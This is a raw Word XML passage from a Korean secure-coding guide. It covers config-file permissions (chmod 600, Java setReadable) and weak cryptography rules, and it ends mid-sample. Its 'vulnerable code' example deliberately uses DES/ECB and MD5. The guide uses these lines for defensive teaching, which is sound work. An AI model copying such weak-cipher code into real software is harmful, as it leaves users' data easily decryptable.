                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>프로세스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>침투</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배포</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어집니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t># [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소유자만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>읽기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쓰기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># chmod 600 application.properties  → -rw------- (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>소유자만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"># </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> Java </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>코드에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>File configFile = new File("application.properties");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">configFile.setReadable(false, false);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>읽기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>금지</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">configFile.setReadable(true, true);   // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>소유자만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>읽기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="0007172E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>암호화</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>알고리즘</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사용</w:t>
      </w:r>
      <w:r w:rsidR="0007172E">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• DES, RC4 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등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취약한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알고리즘을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금지하고</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> AES-128 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>, ARIA, SEED</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시함수는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> MD5, SHA-1 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대신</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> SHA-256 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상을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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자체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개발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암호화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알고리즘을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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] DES </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (56</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이미</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>깨진</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>알고리즘</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] MD5 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>충돌</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약점</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
